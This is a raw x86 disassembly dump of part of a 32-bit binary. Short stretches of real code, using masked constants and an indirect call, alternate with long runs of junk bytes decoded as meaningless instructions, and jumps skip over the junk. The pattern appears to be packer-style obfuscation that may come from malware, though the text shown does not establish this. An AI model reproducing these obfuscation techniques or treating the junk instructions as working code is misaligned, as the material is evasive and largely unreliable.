  410ba2:	fs je  0x410be8
  410ba5:	ins    BYTE PTR es:[edi],dx
  410ba6:	or     ch,BYTE PTR [ecx+0x28ba2c0a]
  410bac:	mov    al,ds:0xd48cde56
  410bb1:	xchg   DWORD PTR [ebp-0x30],esp
  410bb4:	cmp    bh,BYTE PTR [esi]
  410bb6:	jp     0x410c19
  410bb8:	sub    DWORD PTR [esi],esi
  410bba:	pop    esi
  410bbb:	nop
  410bbc:	neg    DWORD PTR [edx-0x2bed7a4f]
  410bc2:	mov    edx,edx
  410bc4:	xchg   DWORD PTR [ecx-0x3b],edx
  410bc7:	mov    al,0x2f
  410bc9:	das    
  410bca:	lahf   
  410bcb:	jbe    0x410c1c
  410bcd:	test   eax,0x49535d13
  410bd2:	sub    dl,cl
  410bd4:	sti    
  410bd5:	rcr    cl,0x62
  410bd8:	imul   esp,DWORD PTR [ebx*8+0x5af94381],0x9d92c557
  410be3:	xor    eax,0x931cca2
  410be8:	test   al,0xc6
  410bea:	and    ebx,DWORD PTR [ebx+ebx*2]
  410bed:	lea    ecx,[eax-0x7a]
  410bf0:	imul   ebx,DWORD PTR [edx-0x78a3315],0x1a475b77
  410bfa:	mov    dl,0xea
  410bfc:	sbb    al,0xf3
  410bfe:	lods   eax,DWORD PTR ds:[esi]
  410bff:	into   
  410c00:	test   al,0x2c
  410c02:	iret   
  410c03:	mov    edi,DWORD PTR [esi+0x5fe5866f]
  410c09:	mov    edx,0x42d0ed60
  410c0e:	xor    al,0x19
  410c10:	loop   0x410be3
  410c12:	adc    bl,0xd9
  410c15:	fisttp WORD PTR [ebx]
  410c17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c18:	sub    BYTE PTR [esi+eiz*8],bl
  410c1b:	dec    ecx
  410c1c:	pop    ebx
  410c1d:	xchg   ebx,ecx
  410c1f:	sub    ebx,ecx
  410c21:	xchg   ebx,ecx
  410c23:	dec    ecx
  410c24:	mov    eax,DWORD PTR [ebp-0x1c]
  410c27:	imul   eax,ecx
  410c2a:	sub    esp,eax
  410c2c:	mov    DWORD PTR [ebp-0x24],esp
  410c2f:	mov    eax,DWORD PTR [ebp-0x4]
  410c32:	mov    ecx,0x7510853
  410c37:	xor    eax,ecx
  410c39:	mov    edx,0x32729a
  410c3e:	add    eax,edx
  410c40:	mov    DWORD PTR [ebp+0x8],eax
  410c43:	mov    eax,DWORD PTR [ebp-0x18]
  410c46:	xor    eax,ecx
  410c48:	add    eax,edx
  410c4a:	mov    edx,DWORD PTR [ebp+0x14]
  410c4d:	imul   eax,DWORD PTR [edx]
  410c50:	mov    edx,DWORD PTR [ebp-0x4]
  410c53:	xor    edx,ecx
  410c55:	mov    ecx,DWORD PTR [ebp+0x8]
  410c58:	lea    ecx,[edx+ecx*1+0x32729a]
  410c5f:	cmp    ecx,eax
  410c61:	je     0x411089
  410c67:	mov    edi,DWORD PTR [ebp-0x18]
  410c6a:	mov    eax,DWORD PTR [ebp+0x8]
  410c6d:	mov    edx,DWORD PTR [ebp+0x14]
  410c70:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  410c74:	jmp    0x410daf
  410c79:	sbb    DWORD PTR [eax+0x31],0x6d5dfd4a
  410c80:	jae    0x410c66
  410c82:	jb     0x410c33
  410c84:	pop    ds
  410c85:	adc    al,0x92
  410c87:	cdq    
  410c88:	dec    eax
  410c89:	aaa    
  410c8a:	inc    esp
  410c8b:	jl     0x410d09
  410c8d:	adc    bh,BYTE PTR [edi+0x7c]
  410c90:	jl     0x410c3e
  410c92:	push   ebx
  410c93:	cld    
  410c94:	ss arpl dx,sp
  410c97:	outs   dx,DWORD PTR ds:[esi]
  410c98:	call   0x3a155611
  410c9d:	leave  
  410c9e:	pushf  
  410c9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ca0:	data16 fdivr DWORD PTR [edx+0x75]
  410ca4:	pop    edi
  410ca5:	inc    esi
  410ca6:	js     0x410c79
  410ca8:	bound  edx,QWORD PTR [edi]
  410caa:	popa   
  410cab:	pushf  
  410cac:	dec    eax
  410cad:	fwait
  410cae:	rcr    esp,1
  410cb0:	xor    edx,DWORD PTR [ecx]
  410cb2:	cld    
  410cb3:	sbb    al,0xf
  410cb6:	mov    ds:0x425a0ebf,eax
  410cbb:	idiv   BYTE PTR [ecx+eiz*4-0x25]
  410cbf:	outs   dx,BYTE PTR ds:[esi]
  410cc0:	mov    ds:0x4d4f6465,al
  410cc5:	loopne 0x410c74
  410cc7:	and    DWORD PTR [ebx+ebx*1-0x5131b692],0xfffffff4
  410ccf:	ins    DWORD PTR es:[edi],dx
  410cd0:	xor    al,0x20
  410cd2:	jae    0x410c8a
  410cd4:	test   eax,0xcb4be1d4
  410cd9:	stc    
  410cda:	push   edx
  410cdb:	out    0x2c,eax
  410cdd:	stos   DWORD PTR es:[edi],eax
  410cde:	ins    BYTE PTR es:[edi],dx
  410cdf:	call   0xf22fcc6e
  410ce4:	pop    ebp
  410ce5:	test   eax,0x6c1451f3
  410cea:	add    BYTE PTR [ecx+edi*2-0x601cf2d2],0xd
  410cf2:	ja     0x410d4c
  410cf4:	rcl    BYTE PTR [ebx+0x4e77661e],0x8
  410cfb:	push   ds
  410cfc:	sub    DWORD PTR [ebp-0x13aeae7b],ebp
  410d02:	jge    0x410ce2
  410d04:	sti    
  410d05:	and    dh,BYTE PTR [eax-0x42]
  410d08:	mov    es,WORD PTR [esi+0x6b6ff11a]
  410d0e:	add    DWORD PTR ds:0x317ab3ed,0x8e9cfff8
  410d18:	or     ebx,edi
  410d1a:	xor    BYTE PTR [edi-0x59],ch
  410d1d:	ja     0x410d9b
  410d1f:	rcl    ebx,cl
  410d21:	xor    bl,BYTE PTR [ebx-0x5a]
  410d24:	arpl   bp,dx
  410d26:	adc    dl,0xf9
  410d29:	and    DWORD PTR [edi+0x79],ebx
  410d2c:	stc    
  410d2d:	push   ss
  410d2e:	fidiv  DWORD PTR [edi-0x917735e]
  410d34:	jne    0x410cc1
  410d36:	das    
  410d37:	fld    QWORD PTR [ebx-0x6e129f7c]
  410d3d:	fcmove st,st(4)
  410d3f:	mov    esp,0xc44e149c
  410d44:	daa    
  410d45:	inc    ebp
  410d46:	jo     0x410daf
  410d48:	fdivr  st(1),st
  410d4a:	cmp    al,0x9d
  410d4c:	xchg   esp,eax
  410d4d:	sbb    esp,edi
  410d4f:	shr    DWORD PTR [eax],0x32
  410d52:	aad    0xae
  410d54:	mov    dh,al
  410d56:	int3   
  410d57:	ss dec ebx
  410d59:	mov    ebp,0xe8328396
  410d5e:	pop    edi
  410d5f:	xor    BYTE PTR [ebp+0x38],ah
  410d62:	lea    esp,[ebx-0x3d]
  410d65:	int    0x5a
  410d67:	inc    ebx
  410d68:	cli    
  410d69:	dec    edx
  410d6a:	sti    
  410d6b:	fisubr WORD PTR [ebp+ecx*1+0x7257ec77]
  410d72:	jb     0x410cf6
  410d74:	call   0x40f8:0xd172e036
  410d7b:	mov    eax,ds:0x162e7e84
  410d80:	aad    0xa
  410d82:	pop    ebx
  410d83:	inc    ebp
  410d84:	pop    ss
  410d85:	add    eax,DWORD PTR [ebp-0x57]
  410d88:	pop    ds
  410d89:	std    
  410d8a:	jp     0x410d6c
  410d8c:	lods   al,BYTE PTR ds:[esi]
  410d8d:	repnz and eax,DWORD PTR [edx+0x58]
  410d91:	push   ecx
  410d93:	data16 aad 0xa4
  410d96:	je     0x410d7b
  410d98:	add    DWORD PTR [esi-0x70d5ae53],0xffffffa1
  410d9f:	aam    0xc5
  410da1:	js     0x410d7e
  410da3:	xchg   DWORD PTR [edi-0x7],esp
  410da6:	popa   
  410da7:	into   
  410da8:	fsub   QWORD PTR [edi-0x65]
  410dab:	gs fld st(0)
  410dae:	dec    ebp
  410daf:	mov    ecx,0x7510853
  410db4:	xor    edx,edx
  410db6:	xor    edi,ecx
  410db8:	mov    esi,0x32729a
  410dbd:	add    edi,esi
  410dbf:	div    edi
  410dc1:	mov    edx,DWORD PTR [ebp-0x4]
  410dc4:	xor    edx,ecx
  410dc6:	lea    eax,[edx+eax*1+0x32729a]
  410dcd:	mov    edx,DWORD PTR [ebp+0x8]
  410dd0:	mov    edi,DWORD PTR [ebp-0x24]
  410dd3:	mov    DWORD PTR [edi+edx*4],eax
  410dd6:	mov    eax,DWORD PTR [ebp-0x18]
  410dd9:	mov    edx,DWORD PTR [ebp+0x8]
  410ddc:	xor    eax,ecx
  410dde:	lea    eax,[eax+edx*1+0x32729a]
  410de5:	mov    DWORD PTR [ebp+0x8],eax
  410de8:	mov    eax,DWORD PTR [ebp-0x18]
  410deb:	mov    edx,DWORD PTR [ebp+0x14]
  410dee:	xor    eax,ecx
  410df0:	jmp    0x410f2b
  410df5:	mov    ch,0xd5
  410df7:	or     dh,dh
  410df9:	push   0xd05d7df1
  410dfe:	sbb    DWORD PTR [ebx-0x27aeee00],esi
  410e04:	dec    ecx
  410e05:	aad    0x47
  410e07:	jl     0x410e85
  410e09:	adc    bh,BYTE PTR [edi+0x7c]
  410e0c:	jl     0x410d98
  410e0e:	xor    BYTE PTR [edi-0x75951651],bh
  410e14:	stos   BYTE PTR es:[edi],al
  410e15:	jp     0x410e5a
  410e17:	or     cl,BYTE PTR [edx]
  410e19:	sub    ecx,edi
  410e1b:	xchg   ebp,eax
  410e1c:	jl     0x410dc6
  410e1e:	leave  
  410e1f:	retf   
  410e20:	addr16 sahf 
  410e22:	mov    edx,0xdf3c25
  410e27:	rcl    bh,0x94
  410e2a:	sub    al,0x34
  410e2c:	mov    eax,0x7d47e34b
  410e31:	cmc    
  410e32:	pop    DWORD PTR [ecx]
  410e34:	fxch   st(2)
  410e36:	xor    al,BYTE PTR [edi-0x14b17307]
  410e3c:	sbb    al,0xbc
  410e3e:	jns    0x410dc3
  410e40:	mov    ds:0x498f3309,eax
  410e45:	out    0x73,eax
  410e47:	or     al,0x44
  410e49:	popa   
  410e4a:	ins    BYTE PTR es:[edi],dx
  410e4b:	lds    edi,FWORD PTR [ecx-0x7d]
  410e4e:	(bad)  
  410e51:	pop    esp
  410e52:	add    al,0xac
  410e54:	xlat   BYTE PTR ds:[ebx]
  410e55:	fdivr  QWORD PTR [eax-0x49]
  410e58:	xchg   DWORD PTR [ecx+0x17],eax
  410e5b:	sub    ah,0x12
  410e5e:	jmp    0x239e5e25
  410e63:	js     0x410edb
  410e65:	loope  0x410df1
  410e67:	(bad)  
  410e68:	aad    0x88
  410e6a:	mov    WORD PTR [edx-0x63],cs
  410e6d:	outs   dx,BYTE PTR ds:[esi]
  410e6e:	lahf   
  410e6f:	rcl    BYTE PTR [ebp+0x6047c03b],0xc0
  410e76:	gs aaa 
  410e78:	(bad)  
  410e79:	rcr    BYTE PTR [edx-0x275e1f51],cl
  410e7f:	into   
  410e80:	shl    BYTE PTR [edx],0x3f
  410e83:	fstp   TBYTE PTR [edx-0x7a87529]
  410e89:	push   ebx
  410e8a:	stos   DWORD PTR es:[edi],eax
  410e8b:	mov    ecx,0x8c485d48
  410e90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e91:	test   al,0x12
  410e93:	fs mov ecx,edx
  410e96:	xchg   esp,eax
  410e97:	xchg   dh,bh
  410e99:	ins    BYTE PTR es:[edi],dx
  410e9a:	fwait
  410e9b:	pop    eax
  410e9c:	ret    0x645c
  410e9f:	call   0x32b7:0xf8a7d2a1
  410ea6:	test   eax,0x51cf1d82
  410eab:	adc    BYTE PTR [ebx-0x12],dh
  410eae:	and    ah,bh
  410eb0:	(bad)  
  410eb2:	stc    
  410eb3:	pushf  
  410eb4:	mov    cl,0x85
  410eb6:	xor    eax,0x99f2fa3e
  410ebb:	add    DWORD PTR [edx-0x1b],ebp
  410ebe:	pushf  
  410ebf:	jp     0x410f29
  410ec1:	push   edi
  410ec2:	je     0x410f2b
  410ec4:	xchg   esi,eax
  410ec5:	push   ebp
  410ec6:	aas    
  410ec7:	aad    0x9a
  410ec9:	adc    al,0xb9
  410ecb:	or     eax,0x966789e1
  410ed0:	push   ebx
  410ed1:	pop    esi
  410ed2:	xchg   esi,eax
  410ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ed4:	and    eax,0xadfa9483
  410ed9:	mov    ds:0xf24d12ed,al
  410ede:	rdrand ebx
  410ee1:	xor    esp,DWORD PTR ss:[ebx-0x5a071ef8]
  410ee8:	jo     0x410f57
  410eea:	mov    eax,ds:0xe224b7f3
  410eef:	ret    0x612
  410ef2:	aas    
  410ef3:	loope  0x410f64
  410ef5:	int3   
  410ef6:	pop    es
  410ef7:	ficom  DWORD PTR [ecx+0x4a]
  410efa:	pop    esi
  410efb:	repnz adc al,0x50
  410efe:	push   ds
  410eff:	cmp    ecx,edi
  410f01:	mov    ah,0x2e
  410f03:	xchg   edi,eax
  410f04:	fucomp st(6)
  410f06:	sub    cl,bh
  410f08:	mov    bh,bl
  410f0a:	mov    esi,0x859e6b8e
  410f0f:	fwait
  410f10:	adc    ebx,DWORD PTR [edi+ebx*1-0x3c]
  410f14:	out    dx,eax
  410f15:	icebp  
  410f16:	shl    BYTE PTR [ebp+0x67],0x1b
  410f1a:	add    eax,0x3614058a
  410f1f:	gs js  0x410eb7
  410f22:	push   ss
  410f23:	dec    edx
  410f24:	cld    
  410f25:	sbb    cl,BYTE PTR [edx+0x52]
  410f28:	(bad)  
  410f2a:	popf   
  410f2b:	add    eax,esi
  410f2d:	imul   eax,DWORD PTR [edx]
  410f30:	mov    edx,DWORD PTR [ebp-0x4]
  410f33:	xor    edx,ecx
  410f35:	mov    ecx,DWORD PTR [ebp+0x8]
  410f38:	jmp    0x411073
  410f3d:	pop    eax
  410f3e:	shl    BYTE PTR [ebp+0x13],0x7d
  410f42:	mov    ebp,0x8c3c7362
  410f47:	cmp    cl,al
  410f49:	jle    0x410ed2
  410f4b:	mov    bh,0x4a
  410f4d:	jmp    0x410f95
  410f4f:	jl     0x410fcd
  410f51:	adc    bh,BYTE PTR [edi+0x7c]
  410f54:	jl     0x410f07
  410f56:	in     eax,dx
  410f57:	xchg   ebx,eax
  410f58:	and    DWORD PTR [eax-0x6b],edi
  410f5b:	push   edx
  410f5c:	in     eax,0x91
  410f5e:	or     al,0x49
  410f60:	in     al,0xe9
  410f62:	and    ecx,DWORD PTR [edx]
  410f64:	xor    eax,0xbbd8d2bb
  410f69:	inc    ebp
  410f6a:	xor    cl,dh
  410f6c:	mov    ds:0x4b30826f,al
  410f71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f72:	mov    esi,0x6196445c
  410f77:	inc    edi
  410f78:	inc    esi
  410f79:	das    
  410f7a:	and    eax,0x7cc08726
  410f7f:	mov    esp,0x73dcbe76
  410f84:	mov    esi,DWORD PTR [eax+0x1a]
  410f87:	shl    bh,1
  410f89:	(bad)  
  410f8a:	xor    al,0xa7
  410f8c:	and    BYTE PTR [edi+0x58e8ab51],dl
  410f92:	push   ss
  410f93:	pop    edx
  410f94:	loope  0x411012
  410f96:	call   0x13e:0x53d220e6
  410f9d:	mov    ch,0xf7
  410f9f:	fldcw  WORD PTR [ebx+0x3c]
  410fa2:	jae    0x411005
  410fa4:	sub    DWORD PTR [edx-0x5b],esi
  410fa7:	pop    eax
  410fa8:	jg     0x410f64
  410faa:	jne    0x410f9e
  410fac:	repz sub eax,0xc1da4e3f
  410fb2:	pusha  
  410fb3:	push   ebp
  410fb4:	pusha  
  410fb5:	adc    al,0xe3
  410fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fb8:	xor    ebp,edx
  410fba:	out    dx,al
  410fbb:	xchg   esi,eax
  410fbc:	out    dx,al
  410fbd:	pop    eax
  410fbe:	ja     0x41101b
  410fc0:	push   ebx
  410fc1:	(bad)  
  410fc2:	or     esi,DWORD PTR ds:0xa8a158c8
  410fc8:	popa   
  410fc9:	sub    ebx,0x25
  410fcc:	pushf  
  410fcd:	clc    
  410fce:	push   edi
  410fcf:	cmc    
  410fd0:	xchg   ecx,eax
  410fd1:	inc    ebp
  410fd2:	or     eax,0x2f8f7beb
  410fd7:	and    BYTE PTR [ecx+ecx*8],ch
  410fda:	mov    al,ds:0x15476742
  410fdf:	dec    esi
  410fe0:	cmp    al,BYTE PTR [ecx+0x36]
  410fe3:	jae    0x410f75
  410fe5:	inc    esi
  410fe6:	xchg   ecx,eax
  410fe7:	stc    
  410fe8:	xor    BYTE PTR [eax+0x2703e9d5],ch
  410fee:	stos   DWORD PTR es:[edi],eax
  410fef:	jg     0x410ff8
  410ff1:	lea    esi,[ebx+ebp*4+0x398ce491]
  410ff8:	inc    ebx
  410ff9:	jmp    0x410f90
  410ffb:	aam    0xf5
  410ffd:	mov    al,0x4d
  410fff:	bound  esi,QWORD PTR [bx+di]
  411002:	and    eax,0x8fb9830f
  411007:	pop    ebx
  411008:	outs   dx,DWORD PTR ds:[esi]
  411009:	fsubr  QWORD PTR [esi]
  41100b:	rol    BYTE PTR [eax+0xb3129c6],cl
  411011:	mov    edx,0x96d542e2
  411016:	popa   
  411017:	inc    ecx
  411018:	pop    es
  411019:	cmc    
  41101a:	push   ecx
  41101b:	pop    ds
  41101c:	out    dx,al
  41101d:	jb     0x411013
  41101f:	and    BYTE PTR [esi+eiz*4],bh
  411022:	pop    ebp
  411023:	xchg   ecx,eax
  411024:	jo     0x41109c
  411026:	int3   
  411027:	imul   esi,DWORD PTR [esi+eiz*2-0x4cc8944b],0xffffffef
  41102f:	inc    edx
  411030:	adc    edi,ecx
  411032:	sub    bh,bh
  411034:	and    edi,0x5b
  411037:	sbb    dl,BYTE PTR [eax+0x6c]
  41103a:	mov    BYTE PTR ds:0x2d4a9078,ch
  411040:	or     al,0x22
  411042:	xchg   DWORD PTR [ecx],ecx
  411044:	(bad)  
  411045:	mov    ds:0xdd01ff4,al
  41104a:	pop    edx
  41104b:	push   edx
  41104c:	jno    0x411068
  41104e:	cld    
  41104f:	imul   ebx,DWORD PTR [ecx+0x4a],0x1bfc05ef
  411056:	xchg   esp,eax
  411057:	mov    dl,0x2a
  411059:	xchg   ecx,eax
  41105a:	sub    al,0x68
  41105c:	cmp    DWORD PTR [esi],0xccdd3a40
  411062:	push   es
  411063:	jp     0x4110df
  411065:	jge    0x4110c5
  411067:	mov    al,0x91
  411069:	(bad)
  41106c:	out    dx,al
  41106d:	test   eax,0xd6259860
  411072:	jnp    0x411001
  411074:	mov    WORD PTR [edx],cs
  411076:	call   0xfc8:0x3b003272
  41107d:	test   ebp,esp
  41107f:	sti    
  411080:	(bad)  
  411081:	dec    DWORD PTR [ebx+0x5e9de]
  411087:	add    BYTE PTR [eax],al
  411089:	mov    ebx,0x32729a
  41108e:	mov    eax,DWORD PTR [ebp-0x4]
  411091:	xor    eax,0x7510853
  411096:	add    eax,ebx
  411098:	mov    DWORD PTR [ebp-0xc],eax
  41109b:	xor    ebx,ebx
  41109d:	lea    eax,[ebp-0x10]
  4110a0:	jmp    0x4111db
  4110a5:	into   
  4110a6:	aas    
  4110a7:	in     eax,0x49
  4110a9:	cmc    
  4110aa:	jne    0x411116
  4110ac:	mov    edi,0x9e11fbf4
  4110b1:	imul   esi,DWORD PTR [ecx+0x4189d66b],0x7c
  4110b8:	jl     0x4110cc
  4110ba:	jg     0x411138
  4110bc:	jl     0x41107b
  4110be:	mov    dh,0x67
  4110c0:	fwait
  4110c1:	and    ch,al
  4110c3:	scas   al,BYTE PTR es:[edi]
  4110c4:	std    
  4110c5:	dec    DWORD PTR [eax]
  4110c7:	mov    al,0xf1
  4110c9:	sbb    eax,0x82321a27
  4110ce:	stos   BYTE PTR es:[edi],al
  4110cf:	stos   DWORD PTR es:[edi],eax
  4110d0:	sub    eax,edi
  4110d2:	das    
  4110d3:	inc    BYTE PTR [ebp+0x16535e21]
  4110d9:	sub    al,0xb4
  4110db:	sbb    eax,DWORD PTR ds:0x611322ea
  4110e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110e2:	add    ecx,ebx
  4110e4:	fsubr  QWORD PTR [eax+0x3]
  4110e7:	mov    ebx,DWORD PTR [esi+edi*4]
  4110ea:	mov    ah,0xbb
  4110ec:	ret    
  4110ed:	(bad)  [ebx]
  4110ef:	mov    ebp,0x2ebbc2c
  4110f4:	fsub   QWORD PTR [ebp+0x2348a64f]
  4110fa:	imul   ebx,DWORD PTR [esp+edx*1-0x3a],0x3953e6c1
  411102:	mov    esp,DWORD PTR [edx]
  411104:	test   DWORD PTR [ebx],eax
  411106:	and    BYTE PTR ds:0x5a3fb492,0xe1
  41110d:	mov    ah,0x49
  41110f:	or     BYTE PTR [ebx-0x79],dl
  411112:	mov    ds:0x4b9e2cfe,eax
  411117:	int3   
  411118:	mov    esi,0xaf337bcd
  41111d:	mov    bl,0xc0
  41111f:	push   cs
  411120:	mov    ebp,0x72ad6067
  411125:	cdq    
  411126:	pop    edi
  411127:	les    esi,FWORD PTR [edx+0x2b]
  41112a:	jge    0x4111a0
  41112c:	xor    BYTE PTR [ebp+0x2299a90d],dh
  411132:	jae    0x41112c
  411134:	sub    dl,BYTE PTR [eax-0x1eda2e78]
  41113a:	cli    
  41113b:	pop    edx
  41113c:	repz leave 
  41113e:	sbb    BYTE PTR [edx+0x11149d3],bh
  411144:	sub    dl,BYTE PTR [esi+0x17]
  411147:	stc    
  411148:	jne    0x411100
  41114a:	sub    al,0x3c
  41114c:	add    bh,bh
  41114e:	int3   
  41114f:	dec    eax
  411150:	jmp    0x12b5f98
  411155:	sbb    al,0x76
  411157:	adc    DWORD PTR [ecx+0x48],esp
  41115a:	push   0x4e31e093
  41115f:	or     bl,BYTE PTR [eax]
  411161:	push   ebp
  411162:	scas   eax,DWORD PTR es:[edi]
  411163:	jne    0x411173
  411165:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411166:	jle    0x411194
  411168:	sbb    bl,BYTE PTR [edi*1+0x924e300]
  41116f:	retf   
  411170:	repnz popa 
  411172:	icebp  
  411173:	xchg   ebp,eax
  411174:	(bad)  
  411175:	sbb    eax,0x5b1ca740
  41117a:	cmp    esi,eax
  41117c:	(bad)  [edi]
  41117e:	mov    bh,0x16
  411180:	push   0xffffffae
  411182:	repnz cmp al,0xe1
  411185:	test   eax,0x10a4459d
  41118a:	mov    ebx,0xf47f166b
  41118f:	rol    BYTE PTR [ebp-0x76],0xa1
  411193:	jmp    FWORD PTR [ebx]
  411195:	pop    esp
  411196:	loope  0x4111d1
  411198:	xor    dh,bh
  41119a:	shl    BYTE PTR [ebp+0x7e6622f8],0xfd
  4111a1:	add    edi,edi
  4111a3:	stos   BYTE PTR es:[edi],al
  4111a4:	addr16 jle 0x411184
  4111a7:	xchg   DWORD PTR [edx+edi*4+0x520582ba],esp
  4111ae:	xor    al,0xa6
  4111b0:	lahf   
  4111b1:	adc    DWORD PTR [edi-0x726ebb46],eax
  4111b7:	(bad)  
  4111b8:	aad    0x79
  4111ba:	push   edx
  4111bb:	rcr    DWORD PTR [ecx],1
  4111bd:	push   ebx
  4111be:	pop    esp
  4111bf:	xlat   BYTE PTR ds:[ebx]
  4111c0:	mov    ds:0x40fbdc42,eax
  4111c5:	push   es
  4111c6:	in     al,0xa0
  4111c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111c9:	or     al,0x19
  4111cc:	push   0x34
  4111ce:	outs   dx,BYTE PTR ds:[esi]
  4111cf:	pop    eax
  4111d0:	test   BYTE PTR ds:0xf5973978,bl
  4111d6:	push   edx
  4111d7:	addr16 push ecx
  4111d9:	xchg   DWORD PTR [esi],edi
  4111db:	add    ebx,DWORD PTR [eax]
  4111dd:	call   ebx
  4111df:	xor    ebx,ebx
  4111e1:	inc    ebx
  4111e2:	cmp    DWORD PTR [ebp+0x10],ebx
  4111e5:	je     0x41133e
  4111eb:	xchg   edx,eax
  4111ec:	jmp    0x411327
  4111f1:	push   ecx
  4111f2:	(bad)  
  4111f3:	fsub   st(2),st
  4111f5:	imul   esi,edx,0x2efa635d
  4111fb:	enter  0x765a,0xfc
  4111ff:	push   esp
  411200:	into   
  411201:	scas   eax,DWORD PTR es:[edi]
  411202:	inc    eax
  411203:	jl     0x411281
  411205:	adc    bh,BYTE PTR [edi+0x7c]
  411208:	jl     0x4111bb
  41120a:	(bad)  
  41120b:	aam    0x38
  41120d:	lods   eax,DWORD PTR ds:[esi]
  41120e:	add    DWORD PTR [ebp+0x54d2780c],0x1a
  411215:	pop    es
  411216:	and    BYTE PTR [ecx+ebp*2-0x60964076],0x4d
  41121e:	xor    cl,BYTE PTR [eax+ebx*1]
  411221:	retf   
  411222:	mov    ds,ebp
  411224:	sbb    DWORD PTR [ebx],ecx
  411226:	ror    BYTE PTR [edx-0x56174f55],1
  41122c:	cmp    BYTE PTR [edi+0x2641eaff],dl
  411232:	push   ecx
  411233:	sub    al,dl
  411235:	aad    0x9
  411237:	add    al,0xf3
  411239:	in     al,0x1d
  41123b:	adc    edi,ebp
  41123d:	pushf  
  41123e:	outs   dx,BYTE PTR ds:[esi]
  41123f:	cli    
  411240:	mov    edi,0x16cd3be
  411245:	not    DWORD PTR [edx+0x26]
  411248:	sbb    eax,0x8e34846b
  41124d:	pop    ss
  41124e:	(bad)  
  41124f:	cmp    al,0x89
  411251:	cmc    
  411252:	or     ebp,DWORD PTR ds:0xdb339cf9
  411258:	push   esi
  411259:	xchg   esp,eax
  41125a:	mov    dh,0xf1
  41125c:	popw   es
  41125e:	jb     0x411285
  411260:	and    edx,DWORD PTR [edi]
  411262:	idiv   BYTE PTR [esi-0x13]
  411265:	sub    DWORD PTR [ebp+eiz*2+0x6a],esi
  411269:	fadd   DWORD PTR ds:0x376f932e
  41126f:	scas   al,BYTE PTR es:[edi]
  411270:	sbb    cl,dh
  411272:	nop
  411273:	sub    BYTE PTR [ebp+0x7e],dh
  411276:	(bad)  
  411277:	jo     0x411226
  411279:	xchg   esi,eax
  41127a:	adc    dh,BYTE PTR ss:[edi+0x701355fa]
  411281:	push   edx
  411282:	add    cl,bh
  411284:	(bad)  
  411285:	sub    eax,0x91a2d6ac
  41128a:	dec    eax
  41128b:	mov    edi,DWORD PTR [edi]
  41128d:	mov    al,0x92
  41128f:	call   0xfa82:0x136761f
  411296:	imul   ebp,DWORD PTR ds:0x4b4287a0,0x1c
  41129d:	xchg   esp,eax
  41129e:	pushf  
  41129f:	sub    eax,0xaf4519ab
  4112a4:	lods   eax,DWORD PTR ds:[esi]
  4112a5:	mov    al,0x3a
  4112a7:	mov    eax,ds:0x827e2862
  4112ac:	push   DWORD PTR [ecx+0x72]
  4112af:	ins    BYTE PTR es:[edi],dx
  4112b0:	push   ebp
  4112b1:	stos   BYTE PTR es:[edi],al
  4112b2:	sti    
  4112b3:	xlat   BYTE PTR ds:[ebx]
  4112b4:	sub    al,0xf0
  4112b6:	hlt    
  4112b7:	cwde   
  4112b8:	cld    
  4112b9:	retf   0x8392
  4112bc:	pop    edx
  4112bd:	sar    BYTE PTR [bx],1
  4112c0:	lea    ecx,[edx]
  4112c2:	xlat   BYTE PTR ds:[ebx]
  4112c3:	xchg   ecx,eax
  4112c4:	pop    es
  4112c5:	push   ecx
  4112c6:	add    eax,0x197b991e
  4112cb:	jge    0x411287
  4112cd:	loope  0x411250
  4112cf:	or     ecx,ecx
  4112d1:	jmp    0x411282
  4112d3:	test   DWORD PTR [bp+di+0x63],0x1f0ebfb9
  4112db:	ror    ah,0xc7
  4112de:	lods   eax,DWORD PTR ds:[esi]
  4112df:	dec    esi
  4112e0:	out    0x83,eax
  4112e2:	mov    WORD PTR [edi-0x50f0fa3],cs
  4112e8:	bnd jne 0x411365
  4112eb:	clc    
  4112ec:	xchg   ecx,eax
  4112ed:	scas   eax,DWORD PTR es:[edi]
  4112ee:	(bad)  
  4112ef:	cmp    al,0x90
  4112f1:	(bad)  
  4112f3:	lods   eax,DWORD PTR ds:[esi]
  4112f4:	stos   DWORD PTR es:[edi],eax
  4112f5:	cwde   
  4112f6:	int3   
  4112f7:	sub    dh,al
  4112f9:	idiv   BYTE PTR [edi]
  4112fb:	test   DWORD PTR [ebp+0x5514793f],edi
  411301:	or     BYTE PTR [ebx+edi*8+0x15],dh
  411305:	addr16 popf 
  411307:	mov    al,0xbe
  411309:	fistp  DWORD PTR [eax+edi*1+0x14]
  41130d:	test   al,0x76
  41130f:	and    al,0x53
  411311:	pop    esi
  411312:	ja     0x411330
  411314:	sub    eax,0x28837d6b
  411319:	inc    esp
  41131a:	jbe    0x4112ae
  41131c:	sbb    al,0x3f
  41131e:	sbb    BYTE PTR [ebx-0x20],cl
  411321:	jg     0x4112c5
  411323:	mov    esp,0x6a72d93c
  411328:	or     bl,BYTE PTR [ecx+0x6a]
  41132b:	add    al,0x5b
  41132d:	inc    ebx
  41132e:	xchg   ebx,ecx
  411330:	sub    ebx,ecx
  411332:	xchg   ebx,ecx
  411334:	dec    ecx
  411335:	mov    eax,DWORD PTR [ebp-0x1c]
  411338:	imul   eax,ecx
  41133b:	add    esp,eax
  41133d:	xchg   edx,eax
  41133e:	push   eax
  41133f:	xor    ebx,ebx
  411341:	mov    edx,esp
  411343:	jmp    0x41147e
  411348:	sub    BYTE PTR [edi+0x7165615e],cl
  41134e:	xor    ebx,DWORD PTR [ebp-0x7b]
  411351:	into   
  411352:	jge    0x411370
  411354:	mov    DWORD PTR ds:0x434dd094,ebp
  41135a:	jl     0x4113d8
  41135c:	adc    bh,BYTE PTR [edi+0x7c]
  41135f:	jl     0x4112f9
  411361:	jp     0x411308
  411363:	imul   esi,DWORD PTR [eax],0xffffff8f
  411366:	hlt    
  411367:	pop    ss
  411368:	into   
  411369:	ja     0x41133f
  41136b:	and    ch,BYTE PTR [ebx+0x2b]
  41136e:	jb     0x4113aa
  411370:	in     eax,dx
